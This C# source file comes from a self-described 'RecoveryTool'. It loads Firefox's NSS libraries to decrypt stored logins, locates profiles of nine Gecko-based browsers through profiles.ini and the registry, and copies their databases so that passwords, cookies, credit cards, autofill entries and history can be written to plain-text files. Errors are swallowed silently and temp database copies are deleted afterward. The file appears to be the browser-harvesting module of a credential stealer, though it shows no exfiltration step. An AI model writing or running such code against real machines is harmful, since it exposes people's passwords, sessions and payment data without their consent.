using RecoveryTool.Recovery.Utilities;
using System.Runtime.InteropServices;
using System.Collections.Concurrent;
using Microsoft.Data.Sqlite;
using Microsoft.Win32;
using System.Text;

namespace RecoveryTool.Recovery.Browsers.Gecko
{
    public static class GeckoCommon
    {
        [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet = CharSet.Ansi)]
        internal delegate int NssInitDelegate(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        internal delegate int Pk11SdrDecryptDelegate(ref SECItem data, ref SECItem result, IntPtr cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        internal delegate int NssShutdownDelegate();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        internal delegate IntPtr PK11_GetInternalKeySlotDelegate();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        internal delegate int PK11_NeedLoginDelegate(IntPtr slot);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
        internal delegate int PK11_CheckUserPasswordDelegate(string password);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        internal delegate void PK11_FreeSlotDelegate(IntPtr slot);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        internal delegate void SECITEM_FreeItemDelegate(ref SECItem item, int free_data);

        [StructLayout(LayoutKind.Sequential)]
        internal struct SECItem
        {
            public int type;
            public IntPtr data;
            public int len;
        }

        internal static NssInitDelegate NSS_Init;
        internal static Pk11SdrDecryptDelegate PK11SDR_Decrypt;
        internal static NssShutdownDelegate NSS_Shutdown;
        internal static PK11_GetInternalKeySlotDelegate PK11_GetInternalKeySlot;
        internal static PK11_NeedLoginDelegate PK11_NeedLogin;
        internal static PK11_CheckUserPasswordDelegate PK11_CheckUserPassword;
        internal static PK11_FreeSlotDelegate PK11_FreeSlot;
        internal static SECITEM_FreeItemDelegate SECITEM_FreeItem;

        private static SafeLibraryHandle nssLibraryHandle;
        private static readonly Lock initLock = new();
        private static readonly SemaphoreSlim InteropSemaphore = new(1, 1);

        public sealed class SafeLibraryHandle : SafeHandle
        {
            public SafeLibraryHandle() : base(IntPtr.Zero, true) { }
            public SafeLibraryHandle(IntPtr handle) : base(IntPtr.Zero, true) => SetHandle(handle);
            public override bool IsInvalid => handle == IntPtr.Zero;
            protected override bool ReleaseHandle() => FreeLibrary(handle);

            [DllImport("kernel32.dll")]
            private static extern bool FreeLibrary(IntPtr hModule);
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern SafeLibraryHandle LoadLibrary(string dllToLoad);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetDllDirectory(string lpPathName);

        private static readonly ConcurrentBag<string> TempFiles = [];

        public static void LoadNssLibrariesOnce(string installPath)
        {
            lock (initLock)
            {
                if (nssLibraryHandle != null && !nssLibraryHandle.IsInvalid) { return; }

                try
                {
                    if (!SetDllDirectory(installPath))
                    {
                        return;
                    }

                    string nssDllPath = Path.Combine(installPath, "nss3.dll");
                    var handle = LoadLibrary(nssDllPath);
                    if (handle.IsInvalid)
                    {
                        return;
                    }

                    IntPtr libHandle = handle.DangerousGetHandle();

                    string[] dependencies = ["softokn3.dll"];
                    foreach (var dep in dependencies)
                    {
                        string depPath = Path.Combine(installPath, dep);
                        if (!File.Exists(depPath))
                        {
                            handle.Dispose();
                            return;
                        }
                        var depHandle = LoadLibrary(depPath);
                        if (depHandle.IsInvalid)
                        {
                            handle.Dispose();
                            return;
                        }
                    }

                    IntPtr nssInitPtr = GetProcAddress(libHandle, "NSS_Init");
                    IntPtr pk11SdrDecryptPtr = GetProcAddress(libHandle, "PK11SDR_Decrypt");
                    IntPtr nssShutdownPtr = GetProcAddress(libHandle, "NSS_Shutdown");
                    IntPtr pk11GetInternalKeySlotPtr = GetProcAddress(libHandle, "PK11_GetInternalKeySlot");
                    IntPtr pk11NeedLoginPtr = GetProcAddress(libHandle, "PK11_NeedLogin");
                    IntPtr pk11CheckUserPasswordPtr = GetProcAddress(libHandle, "PK11_CheckUserPassword");
                    IntPtr pk11FreeSlotPtr = GetProcAddress(libHandle, "PK11_FreeSlot");
                    IntPtr secitemFreeItemPtr = GetProcAddress(libHandle, "SECITEM_FreeItem");

                    if (nssInitPtr == IntPtr.Zero
                        || pk11SdrDecryptPtr == IntPtr.Zero
                        || nssShutdownPtr == IntPtr.Zero
                        || pk11GetInternalKeySlotPtr == IntPtr.Zero
                        || pk11NeedLoginPtr == IntPtr.Zero
                        || pk11CheckUserPasswordPtr == IntPtr.Zero
                        || pk11FreeSlotPtr == IntPtr.Zero
                        || secitemFreeItemPtr == IntPtr.Zero)
                    {
                        handle.Dispose();
                        return;
                    }

                    NSS_Init = Marshal.GetDelegateForFunctionPointer<NssInitDelegate>(nssInitPtr);
                    PK11SDR_Decrypt = Marshal.GetDelegateForFunctionPointer<Pk11SdrDecryptDelegate>(pk11SdrDecryptPtr);
                    NSS_Shutdown = Marshal.GetDelegateForFunctionPointer<NssShutdownDelegate>(nssShutdownPtr);
                    PK11_GetInternalKeySlot = Marshal.GetDelegateForFunctionPointer<PK11_GetInternalKeySlotDelegate>(pk11GetInternalKeySlotPtr);
                    PK11_NeedLogin = Marshal.GetDelegateForFunctionPointer<PK11_NeedLoginDelegate>(pk11NeedLoginPtr);
                    PK11_CheckUserPassword = Marshal.GetDelegateForFunctionPointer<PK11_CheckUserPasswordDelegate>(pk11CheckUserPasswordPtr);
                    PK11_FreeSlot = Marshal.GetDelegateForFunctionPointer<PK11_FreeSlotDelegate>(pk11FreeSlotPtr);
                    SECITEM_FreeItem = Marshal.GetDelegateForFunctionPointer<SECITEM_FreeItemDelegate>(secitemFreeItemPtr);

                    nssLibraryHandle = handle;
                } catch { }
            }
        }

        public static bool InitializeNssForProfile(string profilePath)
        {
            lock (initLock)
            {
                if (NSS_Init == null)
                {
                    return false;
                }

                int initResult = NSS_Init.Invoke(profilePath);
                return initResult == 0;
            }
        }

        public static void ShutdownNss()
        {
            lock (initLock)
            {
                if (NSS_Shutdown == null)
                {
                    return;
                }

                int shutdownResult = NSS_Shutdown.Invoke();

                if (nssLibraryHandle != null && !nssLibraryHandle.IsInvalid)
                {
                    nssLibraryHandle.Dispose();
                    nssLibraryHandle = null;
                }
            }
        }

        public static async Task<string> DecryptAsync(string encryptedData)
        {
            if (string.IsNullOrWhiteSpace(encryptedData))
                return string.Empty;
            await InteropSemaphore.WaitAsync();
            try
            {
                var encBytes = Convert.FromBase64String(encryptedData);
                IntPtr encDataPtr = IntPtr.Zero;
                try
                {
                    encDataPtr = Marshal.AllocHGlobal(encBytes.Length);
                    Marshal.Copy(encBytes, 0, encDataPtr, encBytes.Length);
                    var encItem = new SECItem { type = 0, data = encDataPtr, len = encBytes.Length };
                    var decItem = new SECItem();
                    int rv = PK11SDR_Decrypt(ref encItem, ref decItem, IntPtr.Zero);
                    if (rv != 0) return encryptedData;
                    var decBytes = new byte[decItem.len];
                    Marshal.Copy(decItem.data, decBytes, 0, decItem.len);
                    string decrypted = Encoding.UTF8.GetString(decBytes);
                    SECITEM_FreeItem(ref decItem, 0);
                    return decrypted;
                }
                finally
                {
                    if (encDataPtr != IntPtr.Zero) Marshal.FreeHGlobal(encDataPtr);
                }
            }
            finally
            {
                InteropSemaphore.Release();
            }
        }

        public static Dictionary<string, string> BrowserDirectories = new()
            {
                { "Firefox", @"Mozilla\Firefox\" },
                { "SeaMonkey", @"Mozilla\SeaMonkey\" },
                { "Waterfox", @"Waterfox\" },
                { "Pale Moon", @"Moonchild Productions\Pale Moon\" },
                { "Basilisk", @"Basilisk\" },
                { "K-Meleon", @"K-Meleon\" },
                { "GNU IceCat", @"GNU\IceCat\" },
                { "Conkeror", @"Conkeror\" },
                { "Flock", @"Flock\" }
            };

        public static Dictionary<string, string> FileNames = new()
            {
                { "History", "history.txt" },
                { "Autofill", "autofill.txt" },
                { "CreditCards", "credit_cards.txt" },
                { "Cookies", "cookies.txt" },
                { "Passwords", "passwords.txt" },
                { "Bookmarks", "bookmarks.txt" },
                { "Downloads", "downloads.txt" }
            };

        private static readonly Dictionary<string, string[]> RequiredFiles = new()
            {
                { "Passwords", new[] { "logins.json", "key4.db" } },
                { "History", new[] { "places.sqlite" } },
                { "Bookmarks", new[] { "places.sqlite" } },
                { "Autofill", new[] { "formhistory.sqlite" } },
                { "CreditCards", new[] { "formhistory.sqlite" } },
                { "Cookies", new[] { "cookies.sqlite" } }
            };

        public static async Task<List<string>> GetProfilePathsAsync(string browserName)
        {
            var list = new List<string>();
            var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            if (!BrowserDirectories.TryGetValue(browserName, out string brPath))
            {
                return list;
            }
            string iniPath = Path.Combine(appData, brPath, "profiles.ini");
            if (!File.Exists(iniPath)) return list;
            try
            {
                var parsed = await ParseProfilesIniAsync(iniPath, brPath, appData);
                if (parsed.Count > 0) list.AddRange(parsed);
            } catch { }
            return list.Distinct().ToList();
        }

        public static List<string> GetGeckoInstallPaths()
        {
            var installPaths = new List<string>();
            foreach (var browser in BrowserDirectories)
            {
                string name = browser.Key;
                var regKeys = name switch
                {
                    "Firefox" => new List<string>
                        {
                            @"SOFTWARE\Mozilla\Mozilla Firefox",
                            @"SOFTWARE\WOW6432Node\Mozilla\Mozilla Firefox"
                        },
                    "SeaMonkey" =>
                        [
                            @"SOFTWARE\Mozilla\SeaMonkey",
                            @"SOFTWARE\WOW6432Node\Mozilla\SeaMonkey"
                        ],
                    "Waterfox" =>
                        [
                            @"SOFTWARE\Waterfox Ltd\Waterfox",
                            @"SOFTWARE\WOW6432Node\Waterfox Ltd\Waterfox"
                        ],
                    "Pale Moon" =>
                        [
                            @"SOFTWARE\Moonchild Productions\Pale Moon",
                            @"SOFTWARE\WOW6432Node\Moonchild Productions\Pale Moon"
                        ],
                    "Basilisk" =>
                        [
                            @"SOFTWARE\Moonchild Productions\Basilisk",
                            @"SOFTWARE\WOW6432Node\Moonchild Productions\Basilisk"
                        ],
                    "K-Meleon" =>
                        [
                            @"SOFTWARE\K-Meleon",
                            @"SOFTWARE\WOW6432Node\K-Meleon"
                        ],
                    "GNU IceCat" =>
                        [
                            @"SOFTWARE\GNU\IceCat",
                            @"SOFTWARE\WOW6432Node\GNU\IceCat"
                        ],
                    "Conkeror" =>
                        [
                            @"SOFTWARE\Conkeror",
                            @"SOFTWARE\WOW6432Node\Conkeror"
                        ],
                    "Flock" =>
                        [
                            @"SOFTWARE\Flock",
                            @"SOFTWARE\WOW6432Node\Flock"
                        ],
                    _ => []
                };
                bool found = false;
                foreach (var regKey in regKeys)
                {
                    using var key = Registry.LocalMachine.OpenSubKey(regKey);
                    if (key != null)
                    {
                        if (key.GetValue("CurrentVersion") is string ver)
                        {
                            using var versionKey = key.OpenSubKey($"{ver}\\Main");
                            if (versionKey != null)
                            {
                                var installDir = versionKey.GetValue("Install Directory") as string;
                                if (!string.IsNullOrEmpty(installDir))
                                {
                                    installPaths.Add(installDir);
                                    found = true;
                                    break;
                                }
                            }
                        }
                    }
                }
                if (!found)
                {
                    foreach (var regKey in regKeys)
                    {
                        using var userKey = Registry.CurrentUser.OpenSubKey(regKey);
                        if (userKey != null)
                        {
                            if (userKey.GetValue("CurrentVersion") is string ver2)
                            {
                                using var versionKey = userKey.OpenSubKey($"{ver2}\\Main");
                                if (versionKey != null)
                                {
                                    var installDir = versionKey.GetValue("Install Directory") as string;
                                    if (!string.IsNullOrEmpty(installDir))
                                    {
                                        installPaths.Add(installDir);
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            return installPaths;
        }

        public static async Task<List<string>> GetAllProfilePathsAsync()
        {
            var list = new List<string>();
            var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            foreach (var browser in BrowserDirectories)
            {
                string brPath = browser.Value;
                string iniPath = Path.Combine(appData, brPath, "profiles.ini");
                if (!File.Exists(iniPath))
                {
                    continue;
                }
                try
                {
                    var parsed = await ParseProfilesIniAsync(iniPath, brPath, appData);
                    if (parsed.Count > 0) list.AddRange(parsed);
                } catch { }
            }
            if (list.Count == 0)
            {
                throw new DirectoryNotFoundException("No Gecko-based browser profiles found.");
            }
            return list.Distinct().ToList();
        }

        private static async Task<List<string>> ParseProfilesIniAsync(string iniPath, string brPath, string appData)
        {
            var profiles = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            var lines = await File.ReadAllLinesAsync(iniPath);
            string currentSection = string.Empty;
            for (int i = 0; i < lines.Length; i++)
            {
                if (lines[i].StartsWith("["))
                {
                    currentSection = lines[i];
                    continue;
                }
                if (currentSection.StartsWith("[Profile", StringComparison.OrdinalIgnoreCase))
                {
                    bool isRelative = true;
                    string path = "";
                    while (++i < lines.Length && !lines[i].StartsWith('['))
                    {
                        if (lines[i].StartsWith("IsRelative=", StringComparison.OrdinalIgnoreCase))
                            isRelative = lines[i].EndsWith('1');
                        if (lines[i].StartsWith("Path=", StringComparison.OrdinalIgnoreCase))
                            path = lines[i]["Path=".Length..];
                    }
                    if (!string.IsNullOrEmpty(path))
                    {
                        string resolved = ResolveProfilePath(path, isRelative, brPath, appData);
                        if (!string.IsNullOrEmpty(resolved))
                        {
                            if (Directory.Exists(resolved)) profiles.Add(resolved);
                        }
                    }
                    i--;
                }
                else if (currentSection.StartsWith("[Install", StringComparison.OrdinalIgnoreCase))
                {
                    bool isRelative = true;
                    string path = "";
                    while (++i < lines.Length && !lines[i].StartsWith('['))
                    {
                        if (lines[i].StartsWith("IsRelative=", StringComparison.OrdinalIgnoreCase))
                            isRelative = lines[i].EndsWith('1');
                        if (lines[i].StartsWith("Path=", StringComparison.OrdinalIgnoreCase))
                            path = lines[i]["Path=".Length..];
                        if (lines[i].StartsWith("Default=", StringComparison.OrdinalIgnoreCase))
                            path = lines[i]["Default=".Length..];
                    }
                    if (!string.IsNullOrEmpty(path))
                    {
                        string resolved = ResolveProfilePath(path, isRelative, brPath, appData);
                        if (!string.IsNullOrEmpty(resolved))
                        {
                            if (Directory.Exists(resolved)) profiles.Add(resolved);
                        }
                    }
                    i--;
                }
            }
            return [.. profiles];
        }

        private static string ResolveProfilePath(string path, bool isRelative, string brPath, string appData)
        {
            path = path.Replace('/', '\\');
            if (isRelative)
            {
                string mainDir = Path.Combine(appData, brPath);
                return Path.Combine(mainDir, path);
            }
            return path;
        }

        public static DateTime UnixTimeStampToDateTime(long unixTimeStamp, bool isMilliseconds = true)
        {
            try
            {
                if (isMilliseconds) return DateTimeOffset.FromUnixTimeMilliseconds(unixTimeStamp).LocalDateTime;
                else return DateTimeOffset.FromUnixTimeSeconds(unixTimeStamp).LocalDateTime;
            }
            catch
            {
                return DateTime.MinValue;
            }
        }

        private static List<string> FilterProfilesByDataType(IEnumerable<string> profiles, string dataType)
        {
            if (!RequiredFiles.TryGetValue(dataType, out var requiredFiles)) return profiles.ToList();
            var valid = new List<string>();
            foreach (var p in profiles)
            {
                bool allExist = requiredFiles.All(file => File.Exists(Path.Combine(p, file)));
                if (allExist) valid.Add(p);
            }
            return valid;
        }

        public static async Task RecoverDataAsync(
            string browserName,
            string dataType,
            Func<string, Task<string>> processProfileAsync,
            string defaultFileName)
        {
            var installPaths = GetGeckoInstallPaths();
            if (installPaths.Count == 0)
            {
                return;
            }
            string installPath = installPaths.First();
            LoadNssLibrariesOnce(installPath);
            List<string> profilePaths = await GetProfilePathsAsync(browserName);
            if (profilePaths.Count == 0) { return; }
            var filteredProfiles = FilterProfilesByDataType(profilePaths, dataType);
            if (filteredProfiles.Count == 0)
            {
                return;
            }
            string outFileName = FileNames.TryGetValue(dataType, out string knownFile) ? knownFile : defaultFileName;
            string outPath = EnsureBrowsersRecoveryFilePath(browserName, outFileName);
            var dataEntries = new List<string>();
            foreach (var profilePath in filteredProfiles)
            {
                if (!Directory.Exists(profilePath))
                {
                    continue;
                }
                InitializeNssForProfile(profilePath);
                string data = await processProfileAsync(profilePath);
                if (!string.IsNullOrEmpty(data)) dataEntries.Add(data);
            }
            if (dataEntries.Count > 0)
            {
                using var writer = new StreamWriter(outPath, false, Encoding.UTF8);
                foreach (var chunk in dataEntries) await writer.WriteAsync(chunk);
            }
        }

        public static Task AttemptDeleteAsync(string filePath)
        {
            const int maxRetries = 3;
            for (int attempt = 1; attempt <= maxRetries; attempt++)
            {
                try
                {
                    File.Delete(filePath);
                    break;
                } catch (IOException) when (attempt < maxRetries) { } catch { break; }
            }
            return Task.CompletedTask;
        }

        public static async Task CleanupTempFilesAsync()
        {
            string tempDirectory = Path.GetTempPath();
            var tempFiles = Directory.GetFiles(tempDirectory, "*.sqlite*").ToList();

            foreach (var file in tempFiles) { await AttemptDeleteAsync(file); }
        }

        public static void RegisterTempFile(string tempFilePath) => TempFiles.Add(tempFilePath);
        public static IEnumerable<string> GetRegisteredTempFiles() => TempFiles;
        public static void ClearRegisteredTempFiles() { while (TempFiles.TryTake(out _)) { } }

        public static async Task<string> CopyDatabaseToTempAsync(string sourcePath, string prefix)
        {
            if (!File.Exists(sourcePath)) { return string.Empty; }
            string tempDbPath = Path.Combine(Path.GetTempPath(), $"{prefix}_{Guid.NewGuid()}.sqlite");
            RegisterTempFile(tempDbPath);
            try
            {
                using var sourceStream = new FileStream(sourcePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                using var destinationStream = new FileStream(tempDbPath, FileMode.Create, FileAccess.Write, FileShare.None);
                await sourceStream.CopyToAsync(destinationStream);
            } catch { return string.Empty; }
            return tempDbPath;
        }

        public static async Task<SqliteConnection> OpenSqliteConnectionAsync(string dbPath, bool readOnly = true)
        {
            var connectionStringBuilder = new SqliteConnectionStringBuilder
            {
                DataSource = dbPath,
                Pooling = false
            };
            if (readOnly) connectionStringBuilder.Mode = SqliteOpenMode.ReadOnly;
            var connection = new SqliteConnection(connectionStringBuilder.ToString());
            await connection.OpenAsync();
            return connection;
        }

        public static string EnsureBrowsersRecoveryFilePath(string browserName, string fileName)
        {
            return Common.EnsureBrowsersRecoveryFilePath(browserName, fileName);
        }
    }
}
